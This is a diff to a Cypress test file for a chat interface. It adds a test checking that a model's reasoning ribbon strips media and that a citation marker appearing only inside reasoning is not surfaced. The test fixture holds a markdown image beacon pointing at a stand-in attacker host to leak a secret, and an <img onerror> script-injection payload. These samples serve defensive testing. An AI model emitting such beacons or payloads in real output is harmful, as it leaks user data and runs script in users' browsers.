@@ -163,6 +163,57 @@ describe('R6 — MessageBubble reasoning ribbon + semantic tokens', () => {
 		cy.contains('controlling language is in §12.3').should('be.visible');
 	});
 
+	// ── Security + consistency (adversarial-review fixes) ────────────────────────
+	// Reasoning is untrusted model output: it must be sanitised on the same
+	// media-forbid path as the answer (no <img>/<svg> beacon), and a citation
+	// marker that appears ONLY inside <think> must surface in neither the inline
+	// decorator nor the M2 sidecar (both now scan split.visible).
+	it('sanitises media out of the ribbon and never chips an in-<think> citation', () => {
+		cy.viewport(1280, 900);
+		// Override the messages stub: reasoning carries a beacon image + a raw
+		// <img onerror>, plus a citation marker; the answer body has neither.
+		cy.intercept('GET', '**/api/v1/chats/*/messages*', {
+			items: [
+				{
+					id: MSG_THINK,
+					chat_id: CHAT_ID,
+					role: 'assistant',
+					kind: 'ai',
+					content:
+						'<think>Reasoning with a beacon ![x](http://evil.example/leak?d=secret) and a ' +
+						'raw <img src=x onerror="window.__pwned=1"> plus a "Smuggled quote" (Source: [1]) ' +
+						'inside the reasoning.</think>\n\nThe final answer is yes.',
+					routed_inference_tier: 4,
+					routed_provider: 'minimax',
+					created_at: NOW
+				}
+			],
+			next_cursor: null
+		}).as('messages');
+		cy.intercept('GET', '**/api/v1/chats/*/messages/*/citations', []).as('citations');
+
+		cy.visit(`/lq-ai/chats?id=${CHAT_ID}`);
+		cy.get('[data-testid="lq-ai-reasoning-ribbon"]', { timeout: 15000 }).should('exist');
+		cy.contains('summary', /reasoning/i).click();
+
+		// Sanitisation: reasoning text survives, but no media element does. Scope to
+		// the BODY so the assertion doesn't catch the summary's own chevron <svg>.
+		cy.get('[data-testid="lq-ai-reasoning-ribbon-body"]').should('contain', 'beacon');
+		cy.get('[data-testid="lq-ai-reasoning-ribbon-body"] img').should('not.exist');
+		cy.get('[data-testid="lq-ai-reasoning-ribbon-body"] svg').should('not.exist');
+		cy.get('[data-testid="lq-ai-reasoning-ribbon-body"] image').should('not.exist');
+		// The raw <img onerror> must not have executed.
+		cy.window().then((win) => expect((win as unknown as { __pwned?: unknown }).__pwned).to.be.undefined);
+
+		// Consistency: the only citation marker is inside <think>, so the sidecar
+		// (now scanning split.visible) must render no chip.
+		cy.get('[data-testid="m2-citations"]').should('not.exist');
+		// And the answer prose is clean.
+		cy.get('[data-testid="lq-ai-message-content"]')
+			.first()
+			.should('contain', 'The final answer is yes');
+	});
+
 	// ── Visual evidence: light/dark × wide/narrow ───────────────────────────────
 	it('captures the chat surface across themes and widths', () => {
 		const shots: Array<{ theme: 'light' | 'dark'; w: number; h: number; tag: string }> = [
